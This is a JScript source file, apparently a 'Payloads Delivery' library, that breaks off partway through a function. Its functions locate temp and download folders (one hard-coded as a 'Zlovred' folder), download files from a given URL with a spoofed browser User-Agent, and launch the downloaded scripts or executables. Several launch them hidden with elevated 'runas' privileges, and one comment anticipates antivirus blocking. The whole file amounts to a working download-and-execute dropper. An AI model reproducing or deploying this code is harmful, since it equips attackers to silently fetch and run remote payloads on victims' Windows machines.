/******************************************************************************
 *
 * LIB_FUNC.JS
 * This file contain main modules for Payloads Delivery
 *
 * Revision 1.1.0.0 (Extended Beta) May be Present
 * The Library Links at lib_func-1.0.0.js
 * 
 * Version 1.1.1.0 (Extended Beta) Build 0004
 *
 ******************************************************************************/

/*******************************************************************************
 *
 * Wsleep(Timesec)
 * This function will sleep current job execution at Timesec seconds timeout
 * This Function use a Windows system utilite Timeout
 ******************************************************************************/
function Wsleep(Timesec) {
    var objWsh;
    var strRun; // Execution String
    objWsh = new ActiveXObject("WScript.Shell");
    strRun = "Timeout /T " + Timesec + " /nobreak";
    objWsh.Run( strRun, 0, true);
    objWsh = null;
}

/***********************************************************
    ' RegKeyRead001 Function
    ' This Function Read the Key RegistryKey and Returns
    ' a Key Value String
    ' *********************************************************/
    function RegKeyRead001(registryKey) {
        var winScriptShell;
        var strRes;

        winScriptShell = new ActiveXObject("WScript.Shell");
        strRes = winScriptShell.RegRead(registryKey);
        return strRes;
    }

    /**********************************************************
    ' RegKeyRead002 Function
    ' This Function Read the Key RegistryKey and Returns
    ' a Key Value String
    ' *********************************************************/
    function RegKeyRead002(RootKey, KeyName, ValueName, Architecture) {
        var oCtx, oLocator, oWMI, oReg, oInParams, oOutParams;
        var anEnumKey;
        oCtx = new ActiveXObject("WbemScripting.SWbemNamedValueSet");
        if (typeof Architecture === 'undefined')
            if (WshShell.Environment("SYSTEM").Item("PROCESSOR_ARCHITECTURE").search(/64/ig) >= 0)
                Architecture = 64
            else
                Architecture = 32;
        anEnumKey = KeyName + "\\" + ValueName;
        oCtx.Add("__ProviderArchitecture", Architecture);
        oLocator = new ActiveXObject("Wbemscripting.SWbemLocator");
        oWMI = oLocator.ConnectServer("", "root\\default", "", "", "", "", 0, oCtx);
        oReg = oWMI.Get("StdRegProv");

        var oInParams = oReg.Methods_("GetStringValue").Inparameters;
        oInParams.Hdefkey = RootKey;
        oInParams.Ssubkeyname = KeyName;
        oInParams.Svaluename = ValueName;
        // WScript.Echo("KeyName= "+KeyName+"\nValueName= " + ValueName);
      
        oOutParams = oReg.ExecMethod_("GetStringValue", oInParams, 0, oCtx);
        if( oOutParams == null) {
            return "";
        }
        if( oOutParams.SValue == null) {
            return "";
        }
        return oOutParams.SValue;
    }

/***********************************************************
'
' getDownlEnviron01()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Download Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getDownlEnviron01() {
    var fso, wsh, envProc, envSys, pathTemp;
    var envVariable; // Download Temprorary Folder
    // Downloads Folder Registry Key
    var GUID_WIN_DOWNLOADS_FOLDER;
    var KEY_PATH; 
    var aKey;
	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}";
	KEY_PATH = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\";
	aKey = KEY_PATH + GUID_WIN_DOWNLOADS_FOLDER;
    //
    // Define ActiveX Objects
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    // Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
    // Define System Environment Variable
	envSys = wsh.Environment;
    //
    // Define Downloads Temporary Folder
    pathTemp = RegKeyRead001(aKey);
    // WScript.Echo("Path = " + pathTemp);
    if(pathTemp.indexOf("%USERPROFILE%", 0) != -1) {
        envVariable = pathTemp.repalace("%USERPROFILE%", envProc("USERPROFILE"));
    }
    else {
        envVariable = pathTemp;
    }
    if(!fso.FolderExists(envVariable)) {
        envVariable = envProc("TEMP");
        if(!fso.FolderExists(envVariable)) {
            envVariable = envSys("TMP");
            if(!fso.FolderExists(envVariable)) {
                envVariable = "";
            }
        }
    }
    return envVariable;
}

/**********************************************************
'
' getDownlEnviron02()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Download Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getDownlEnviron02() {
    var HKCR = 0x80000000; //HKEY_CLASSES_ROOT
	var HKCU = 0x80000001; //HKEY_CURRENT_USER
	var HKLM = 0x80000002; //HKEY_LOCAL_MACHINE
	var HKUS = 0x80000003; //HKEY_USERS
	var HKCC = 0x80000005; //HKEY_CURRENT_CONFIG
    var fso, wsh, envProc, envSys, pathTemp, envVariable;
    var GUID_WIN_DOWNLOADS_FOLDER;
    var KEY_PATH;
    GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}";
	KEY_PATH1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\";
	//
	// Define ActiveX Objects
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    // Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
    // Define System Environment Variable
	envSys = wsh.Environment;
    //
    // Define Downloads Temporary Folder
    pathTemp = RegKeyRead002(HKCU, KEY_PATH1, GUID_WIN_DOWNLOADS_FOLDER, 32);
    // WScript.Echo("Path = " + pathTemp);
    if(pathTemp.indexOf("%USERPROFILE%", 0) != -1) {
        envVariable = pathTemp.repalace("%USERPROFILE%", envProc("USERPROFILE"));
    }
    else {
        envVariable = pathTemp;
    }
    if(!fso.FolderExists(envVariable)) {
        envVariable = envProc("TEMP");
        if(!fso.FolderExists(envVariable)) {
            envVariable = envSys("TMP");
            if(!fso.FolderExists(envVariable)) {
                envVariable = "";
            }
        }
    }
    return envVariable;
}

/* *****************************************************************************
'
' getTempEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path for Zlovred Directory if Exists or
'               Path for User Variable %TEMP% if Success or
'               "C:\Windows\Temp" if API Error or
'				"" if General Sysytem Error
'
' *****************************************************************************/
function getTempEnviron() {
	var fso, wsh, envProc, envSys;
	var strZlFolder; // Zlovred Temprorary Folder
	// Define ActiveX Objects
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	// Define Process Environment Variable
	envProc = wsh.Environment("PROCESS");
	// Define System Environment Variable
	envSys = wsh.Environment;
	// Define Zlovred Temprorary Folder
	strZlFolder = "C:\\pub1\\Distrib\\Zlovred";
	// Define and Check Environment Variables
	var envVariable;
	envVariable = strZlFolder;
	if(!fso.FolderExists(envVariable)) {
		envVariable = envProc("TEMP");
		if(!fso.FolderExists(envVariable)) {
			envVariable = envSys("TMP");
			if(!fso.FolderExists(envVariable)) {
				envVariable = "";
			}
		}
	}
	return envVariable;
}

/* ********************************************************
'
' getUtilEnviron()
' This Function Returns the Path for User Variable TEMP
'
' PARAMETERS:   NONE
' RETURNS:      Path For User Variable %UTIL% if Success
'               "%TEMP%" if API Error
'               "" if General Sysytem Error
'
***********************************************************/
function getUtilEnviron() {
	var fso, utilPath;
	// Define ActiveX Objects
	fso = new ActiveXObject("Scripting.FileSystemObject");
	utilPath = "C:\\Util";
	if(!fso.FolderExists(utilPath)) {
		utilPath = getTempEnviron();
	}
	return utilPath;
}
/**********************************************************
 * Function getXmlHttp02
 * This Function Registers XMLHTTP Object both at
 * Windows Script Shell and at Web Browswers
 * If Object can't Register it Returns Empty String
 *
 * PARAMETERS:  NONE
 * RETURNS:     XMLHTTP Object if Success
 *              Empty String if no COM Object Registred
 * *********************************************************/
function getXmlHttp02() {
	// body...
	try {
		// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
		// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
		// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
		return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
	} catch (e) {
		try {
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
			return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
		} catch (ee) {
			try {
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
				return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
				// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
			} catch (eee) {
				try {
					return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
				} catch (eeee) {}
			}
		}
	}
	if(typeof XMLHttpRequest != "undefined") {
		// statement
		return new XMLHttpRequest(); // for Web Browsers
	} else {
		// statement
		return "";
	}
}

/* *****************************************************************************
 '
 ' getSystemRoot()
 ' This Function Returns the Path for %SystemRoot%
 '
 ' PARAMETERS:   NONE
 ' RETURNS:      Path for %SystemRoot% Directory if Exists or
 '               Path for User Variable %windir% if Success or
 '				"" if General Sysytem Error
 '
 ' *****************************************************************************/
function getSystemRoot() {
    var fso, wsh, envProc, envSys;
    var strZlFolder; // Zlovred Temprorary Folder
    // Define ActiveX Objects
    fso = new ActiveXObject("Scripting.FileSystemObject");
    wsh = new ActiveXObject("WScript.Shell");
    // Define Process Environment Variable
    envProc = wsh.Environment("PROCESS");
    // Define System Environment Variable
    envSys = wsh.Environment;
    // Define Zlovred Temprorary Folder
    strZlFolder = "";
    // Define and Check Environment Variables
    var envVariable;
    envVariable = strZlFolder;
    if(!fso.FolderExists(envVariable)) {
        envVariable = envProc("SystemRoot");
        if(!fso.FolderExists(envVariable)) {
            envVariable = envSys("windir");
            if(!fso.FolderExists(envVariable)) {
                envVariable = "";
            }
        }
    }
    return envVariable;
}
    
/* *********************************************************
 * Function getXmlHttp01
 * This Function Registers XMLHTTP Object both at
 * Windows Script Shell and at Web Browswers
 * If Object can't Register it Returns Empty String
 *
 * PARAMETERS:  NONE
 * RETURNS:     XMLHTTP Object if Success
 *              Empty String if no COM Object Registred
 * *********************************************************/
function getXmlHttp01() {
	// body...
	try {
		// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
		// return new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
		// return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
		return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
	} catch (e) {
		try {
			// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
			return new ActiveXObject("MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
		} catch (ee) {
			try {
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.4.0"); // New Unsafe Version for WSH
				// return new ActiveXObject( "MSXML2.ServerXMLHTTP.6.0"); // New Unsafe Version for WSH
				return new ActiveXObject("MSXML2.XMLHTTP"); // Old Safe Version for IE
			} catch (eee) {
				try {
					return new ActiveXObject("Microsoft.XMLHTTP"); // Old Version
				} catch (eeee) {}
			}
		}
	}
	if(typeof XMLHttpRequest != "undefined") {
		// statement
		return new XMLHttpRequest(); // for Web Browsers
	} else {
		// statement
		return "";
	}
}
/* *********************************************************
'
' UploadFilesFromInt( strFile, strURL, strPath )
' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
' and Save it on Local Computer to Path strPath
' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
'
' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
'               strURL -- an URL of the web-site, from which the File
'               is Downloaded
'               strPath -- a Place in a Windows Computer (Full path without slash)
'               in which the File is Downloaded
'
' RETURNS:      0 -- If File is Normally Downloaded and Created
'               1 -- if File in Path strPath Can't Create
'               2 -- if XMLHTTP or ADOStream Can't Initialize
'				3 -- if Emty HTTP Responce or Send Access Denied
'				4 -- if HTTP Response Not 200 (while is not make)
'
* *********************************************************/
function UploadFilesFromInt(strFile, strURL, strPath) {
	var fso, xmlHttp, adoStream;
	// Define FileSystemObject
	try {
		fso = new ActiveXObject("Scripting.FileSystemObject");
	} catch (e) {
		return 1;
	}
	// Define XMLHTTP Help Object
	xmlHttp = getXmlHttp02();
	if(xmlHttp === "") {
		return 2;
	}
	// Define Adodb.Stream Object
	try {
		adoStream = new ActiveXObject("Adodb.Stream");
	} catch (e) {
		return 2;
	}
	var strFileURL;
	var strLocal_Path;
	var intUploadFilesFromInt;
	var blnExistRemoteFile;
	var cb = [];
	// Define Full Downloaded File URL
	strFileURL = strURL + strFile;
	// Define Full Local Path to be Downloaded
	strLocal_Path = strPath + "\\" + strFile;
	// Check if Path is Exist
	if(fso.FolderExists(strPath)) intUploadFilesFromInt = 0;
	else intUploadFilesFromInt = 1;
	// Downloaded File
	// Open URL (Get Requiest synchronous)
	try {
		xmlHttp.Open("GET", strFileURL, false);
	} catch (e) {
		WScript.Echo("Can't Open URL: " + strFileURL + "\nError: " + e);
		return 3;
	}
	// Set User-Agent Header (for Safari Browser)
	xmlHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36");
	// Define Function onreadystatechange
	xmlHttp.onreadystatechange = function() {
		if(xmlHttp.readyState === 4) {
			cb[0] = xmlHttp.status; // Status of Request (Integer Number)
			cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
			cb[2] = xmlHttp.responseText; // Response Text
			cb[3] = xmlHttp.responseBody; // Response Body
		}
	};
	// Send File from URL
	try {
		xmlHttp.Send();
	} catch (e) {
		WScript.Echo("Can't make Send() Request!\nMay be Block with Antivirus?");
		return 3;
	}
	if(cb[0] == 200 && intUploadFilesFromInt == 0)
		// If Send Request is Successful
		blnExistRemoteFile = true;
	else {
		blnExistRemoteFile = false;
		intUploadFilesFromInt = 4;
		WScript.Echo("Wrong HTTP Status:" + cb[0] + "\nURL = " + strFileURL);
		xmlHttp.Abort();
	}
	if(blnExistRemoteFile) {
		// Set AdoStream Type mode and Open It
		adoStream.Type = 1;
		adoStream.Mode = 3;
		adoStream.Open();
		// Write to AdoStream Response Body of HTTP Request
		adoStream.Write(cb[3]);
		// Save Stream to File
		try {
			adoStream.SaveToFile(strLocal_Path, 2);
		} catch (e) {
			WScript.Echo("Can't Save File Stream into File: " + strLocal_Path + "\nCheck Access Rights!");
			intUploadFilesFromInt = 1;
		}
		// /Downloaded File
		// Close Objects
		adoStream.Close();
		xmlHttp.Abort();
		// Check If File Downloaded
		if(!fso.FileExists(strLocal_Path) && intUploadFilesFromInt == 0) intUploadFilesFromInt = 1;
		// /Check if File Downloaded
	}
	return intUploadFilesFromInt;
}

/******************************************************************************
'
' RunDownloadedScript01( strPath, strVBS, intTimeOut )
' This Function Run Hidden a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedScript01(strPath, strVBS, intTimeOut) {
	var constRun_VBS, constOpt;
	// Define Windows Scripts Options
	constRun_VBS = "//Nologo ";
	// Define VBS Script Options (Empty)
	constOpt = "";
	var strValue, shApp, fso, wsh, envProc, pathCMD;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	// Check Paths
	if(!fso.FileExists(pathCMD + "\\cscript.exe")) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strVBS)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = constRun_VBS + "\"" + strPath + "\\" + strVBS + "\"" + constOpt;
	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(pathCMD + "\\cscript.exe", strValue, strPath, "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
	return 0;
}

/******************************************************************************
'
' RunDownloadedAhk01( strPath, strAHK, intTimeOut )
' This Function Run Show a strAHK File
'
' PARAMETERS:   strPath -- The Path to strAHK
'               strAHK -- a AHK File with instructions
'               (Windows AutoHotKey 1.1 Scripts)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedAhk01( strPath, strAHK, intTimeOut ) {
	var constOpt;
	// Define VBS Script Options (Empty)
	constOpt = "";
	var an_AhkPath;
	var strValue, shApp, fso;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	an_AhkPath = "C:\\Util\\AutoHotkeyU32.exe"
	// Check Paths
	if(!fso.FileExists(an_AhkPath)) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strAHK)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = "\"" + strPath + "\\" + strAHK + "\"" + constOpt;
	// Run cscript.exe with Elevated Privileges (runas) at Normal Mode (1), Invisible Mode (0) with working Diretory strPath
	shApp.ShellExecute(an_AhkPath, strValue, strPath, "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
	return 0;
}

/******************************************************************************
'
' RunDownloadedScript02( strPath, strVBS )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedScript02(strPath, strVBS, intTimeOut) {
	var constRun_VBS, constOpt;
	// Define Windows Scripts Options
	constRun_VBS = "//Nologo ";
	// Define VBS Script Options (Empty)
	constOpt = "";
	var strValue, shApp, fso, wsh, envProc, pathCMD;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	// Check Paths
	if(!fso.FileExists(pathCMD + "\\cscript.exe")) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strVBS)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = constRun_VBS + "\"" + strPath + "\\" + strVBS + "\"" + constOpt;
	// Run cscript.exe with Normal Privileges ("") at Normal Mode (1) with working Diretory strPath
	shApp.ShellExecute(pathCMD + "\\cscript.exe", strValue, strPath, "", 1);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
	return 0;
}
/******************************************************************************
'
' RunDownloadedScript03( strPath, strVBS )
' This Function Run a strVBS File
' with Command "cscript //NoLogo " & strPath & "\" & strVBS
' (with metho WScript.Run
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'
' RETURNS:      0 if Success
'				1 if Path not Found
'
******************************************************************************/
function RunDownloadedScript03(strPath, strVBS) {
	var constRun_VBS, constOpt;
	// Define Windows Scripts Options
	constRun_VBS = "//Nologo ";
	// Define VBS Script Options (Empty)
	constOpt = "";
	var strValue, fso, wsh, envProc, pathCMD, strCommand;
	// Define ActiveX Object
	fso = new ActiveXObject("Scripting.FileSystemObject");
	wsh = new ActiveXObject("WScript.Shell");
	envProc = wsh.Environment("PROCESS");
	pathCMD = envProc("SystemRoot") + "\\System32";
	strCommand = pathCMD + "\\cscript.exe"
	// Check Paths
	if(!fso.FileExists(strCommand)) {
		return 1
	};
	if(!fso.FileExists(strPath + "\\" + strVBS)) {
		return 1
	};
	// Set Cscript Command Arguments
	strValue = "\"" + strCommand + "\" " + constRun_VBS + "\"" + strPath + "\\" + strVBS + "\"" + constOpt;
	// Run cscript.exe with Current Privileges (runas) at Invisible Mode (0)
	wsh.Run(strValue, 0, true);
	return 0;
}

/* ********************************************************
'
' AhkDownlRun01( strURL , strFile, iTimeOut )
'
' This Script Downloads AHK file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFile -- Name of AHK File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if System Integrity Error
'				2 if strFile Can't Download
'
' *********************************************************/
function AhkDownlRun01( strURL , strFile, iTimeOut ) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFile, strURL, tempFolder);
	if(iFlag != 0) return 2;
	iFlag = RunDownloadedAhk01(tempFolder, strFile, iTimeOut);
	return iFlag;
}

/* ********************************************************
'
' ScriptDownlRun01( strURL , strFileNameWSH, iTimeOut )
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of WSH File
'				iTimeOut is Wait to End Execution of the File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function ScriptDownlRun01(strURL, strFileNameWSH, iTimeOut) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNameWSH, strURL, tempFolder);
	if(iFlag != 0) return 1;
	RunDownloadedScript01(tempFolder, strFileNameWSH, iTimeOut);
	return 0;
}
/* ********************************************************
'
' ScriptDownlRun03( strURL , strFileNameWSH, iTimeOut )
'
' This Script Downloads Script file from strURL Path and
' Execute it with Script with Current Priveleges
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of WSH File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function ScriptDownlRun03(strURL, strFileNameWSH) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNameWSH, strURL, tempFolder);
	if(iFlag != 0) return 1;
	RunDownloadedScript03(tempFolder, strFileNameWSH);
	return 0;
}
/* ********************************************************
'
' ScriptDownlRunIfChecked00( strURL , strFileNameWSH, iTimeOut, strFile, strFolder )
'
' This Script Downloads WshScript file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
' if strFile or strFolder is Present on Local Computer
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of Exe File
'				iTimeOut is Wait to End Execution of the File
'				strFile is a Checked File. May be Empty String
'				strFolder is a checked Folder. Must Not be Empty
' RETURNS:		0 if Success Download and Run
'				1 if File or Folder is Checked
'				2 if Error Occur
'
' *********************************************************/
function ScriptDownlRunIfChecked00(strURL, strFileNameWSH, iTimeOut, strFile, strFolder) {
	var iFlag, isFlag;
	var isFileEmpty, fso;
	// Set fso
	fso = new ActiveXObject("Scripting.FileSystemObject");
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(strFolder === "" || tempFolder === "") {
		return 2;
	}
	// Check if File Empty
	if(strFile.length == 0) {
		isFileEmpty = 1;
	} else {
		isFileEmpty = 0;
	}
	isFlag = CheckIfFileOrFolderExist(strFile, strFolder);
	// Checck if File or Folder Exists
	if(isFileEmpty == 1 && isFlag < 2 || isFileEmpty == 0 && isFlag == 0) {
		return 1;
	} else {
		iFlag = UploadFilesFromInt(strFileNameWSH, strURL, tempFolder);
		if(iFlag != 0) return 2;
		RunDownloadedScript01(tempFolder, strFileNameWSH, iTimeOut);
		return 0;
	}
}
/* ********************************************************
'
' ScriptDownlRunIfChecked03( strURL , strFileNameWSH, strFile, strFolder )
'
' This Script Downloads WshScript file from strURL Path and
' Execute it with Current Privileges
' if strFile or strFolder is Present on Local Computer
'
' PARAMETERS:	strURL an URL Path to Download
' 				strFileNameWSH - Name of Exe File
'				strFile is a Checked File. May be Empty String
'				strFolder is a checked Folder. Must Not be Empty
' RETURNS:		0 if Success Download and Run
'				1 if File or Folder is Checked
'				2 if Error Occur
'
' *********************************************************/
function ScriptDownlRunIfChecked03(strURL, strFileNameWSH, strFile, strFolder) {
	var iFlag, isFlag;
	var isFileEmpty, fso;
	// Set fso
	fso = new ActiveXObject("Scripting.FileSystemObject");
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(strFolder === "" || tempFolder === "") {
		return 2;
	}
	// Check if File Empty
	if(strFile.length == 0) {
		isFileEmpty = 1;
	} else {
		isFileEmpty = 0;
	}
	isFlag = CheckIfFileOrFolderExist(strFile, strFolder);
	// Checck if File or Folder Exists
	if(isFileEmpty == 1 && isFlag < 2 || isFileEmpty == 0 && isFlag == 0) {
		return 1;
	} else {
		iFlag = UploadFilesFromInt(strFileNameWSH, strURL, tempFolder);
		if(iFlag != 0) return 2;
		RunDownloadedScript03(tempFolder, strFileNameWSH);
		return 0;
	}
}
/******************************************************************************
'
' RunDownloadedExe01(strPath, strVBS, constOpt, intTimeOut )
' This Function Run Hidden a strVBS File
' with Command "strPath & "\" & strVBS " and Arguments constOpt
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/
function RunDownloadedExe01(strPath, strVBS, constOpt, intTimeOut) {
	var strValue, shApp;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	// Set Exe Command Arguments
	strValue = "\"" + strPath + "\\" + strVBS + "\"";
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(strValue, constOpt, strPath, "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
}
/******************************************************************************
'
' RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut )
' This Function Run a strVBS Exe File
' with Command "strPath & "\" & strVBS " and Arguments constOpt
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/
function RunDownloadedExe02(strPath, strVBS, constOpt, intTimeOut) {
	var strValue, shApp;
	// Define ActiveX Object
	shApp = new ActiveXObject("Shell.Application");
	// Set Exe Command Arguments
	strValue = "\"" + strPath + "\\" + strVBS + "\"";
	// Run exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
	shApp.ShellExecute(strValue, constOpt, strPath, "runas", 0);
	//    setTimeout( DoNothing, intTimeOut );
	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
	WScript.Sleep(intTimeOut);
}
/******************************************************************************
'
' RunDownloadedExe03(strPath, strVBS, constOpt )
' This Function Run a strVBS File
' with Command "strPath & "\" & strVBS " and Arguments constOpt
'
' PARAMETERS:   strPath -- The Path to strVBS
'               strVBS -- a VBS File with instructions
'               (Windows Scripts Shell)
'				intTimeOut -- Estimated Time for Running (ms)
'
' RETURNS:      NONE
'
******************************************************************************/
function RunDownloadedExe03(strPath, strVBS, constOpt) {
	var strValue, wsh;
	// Define ActiveX Object
	wsh = new ActiveXObject("WScript.Shell");
	// Set Exe Command Arguments
	strValue = "\"" + strPath + "\\" + strVBS + "\" " + constOpt;
	// Run exe with Curren Privileges at Invisible Mode (0)
	wsh.Run(strValue, 0, true);
}
/* ********************************************************
'
' ExeDownlRun01( strURL, iTimeOut, strFileNameExe, constOpt)
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL - URL Path to Download
'				iTimeOut - Wait to End Execution of the File
' 				strFileNameExe - Name of Exe File
'				constOpt - Options of Exe File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function ExeDownlRun01(strURL, iTimeOut, strFileNameExe, constOpt) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
	if(tempFolder === "") {
		return 1;
	}
	iFlag = UploadFilesFromInt(strFileNameExe, strURL, tempFolder);
	if(iFlag != 0) return 1;
	RunDownloadedExe01(tempFolder, strFileNameExe, constOpt, iTimeOut);
	return 0;
}
/* ********************************************************
'
' ExeDownlRun03( strURL, strFileNameExe, constOpt)
'
' This Script Downloads Exe file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL - URL Path to Download
'				iTimeOut - Wait to End Execution of the File
' 				strFileNameExe - Name of Exe File
'				constOpt - Options of Exe File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function ExeDownlRun03(strURL, strFileNameExe, constOpt) {
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	// Check if strFolder is Empty of TEMP Directory not Assigned
